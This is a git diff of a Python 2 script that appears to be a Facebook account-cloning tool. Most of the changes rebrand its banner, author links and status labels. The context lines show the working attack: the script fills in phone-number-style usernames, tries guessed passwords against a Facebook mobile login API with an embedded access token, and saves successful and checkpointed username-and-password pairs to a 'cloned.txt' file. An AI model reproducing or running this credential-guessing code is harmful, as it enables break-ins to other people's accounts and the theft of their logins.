@@ -82,7 +82,7 @@ os.system("clear")
 print  """
 
                      
-\033[1;94mFACEBOOK  John Ry Adona
+\033[1;94mFACEBOOK  https://facebook.com/DEAUTH3R
                   
 
 """
@@ -97,8 +97,9 @@ logo1 = """  .--.  .-. .-. .---.  .-. .-..-.   .-.         .---.  .-. .-.   .---
        (__)    (_)    (__)     (__)    '-'  '-'(_)                     
 ╔══──────────────────────────
 ║ AUTHOR  🌐 John Ry Adona         
-║  GITHUB ⚛ Commaders                                   
-║ FACEBOOK ♾ John Ry Adona                                     
+║ GITHUB ⚛ https://github.com/Commaders                                   
+║ FACEBOOK ♾ https://facebook.com/DEAUTH3R
+║ YOUTUBE  🔰 https://youtube.com/channel/UCtLzUSwiNXnhq9ikqrgNtog
 ╚══──────────────────────────
 
 """
@@ -139,7 +140,7 @@ while (loop == 'true'):
             os.system('xdg-open https://youtube.com/channel/UCtLzUSwiNXnhq9ikqrgNtog')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://www.facebook.com/DEAUTH3R')
+        os.system('xdg-open https://youtube.com/channel/UCtLzUSwiNXnhq9ikqrgNtog')
 
 
 numm = [5,2,5,2,2]
@@ -283,14 +284,14 @@ def action():
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;93m(FLAME-NAIM-OK)  ' + k + c + user + '  |  ' + pass4 
+                                        print '\x1b[1;93m(SAY-OK)  ' + k + c + user + '  |  ' + pass4 
                                         okb = open('save/cloned.txt', 'a')
                                         okb.write(k+c+user+pass4+'\n')
                                         okb.close()
                                         oks.append(c+user+pass4)
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;97m(FLAME-NAIM-CP) ' + k + c + user + '  |  ' + pass4
+                                            print '\033[1;97m(JOHN-CP) ' + k + c + user + '  |  ' + pass4
                                             cps = open('save/cloned.txt', 'a')
                                             cps.write(k+c+user+pass4+'\n')
                                             cps.close()
@@ -300,14 +301,14 @@ def action():
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
-                                                print '\x1b[1;93m(FLAME-NAIM-OK)  ' + k + c + user + '  |  ' + pass5
+                                                print '\x1b[1;93m(SAY-OK)  ' + k + c + user + '  |  ' + pass5
                                                 okb = open('save/cloned.txt', 'a')
                                                 okb.write(k+c+user+pass5+'\n')
                                                 okb.close()
                                                 oks.append(c+user+pass5)
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
-                                                    print '\033[1;97m(FLAME-NAIM-CP) ' + k + c + user + '  |  ' + pass5 
+                                                    print '\033[1;97m(JOHN-CP) ' + k + c + user + '  |  ' + pass5 
                                                     cps = open('save/cloned.txt', 'a')
                                                     cps.write(k+c+user+pass5+'\n')
                                                     cps.close()
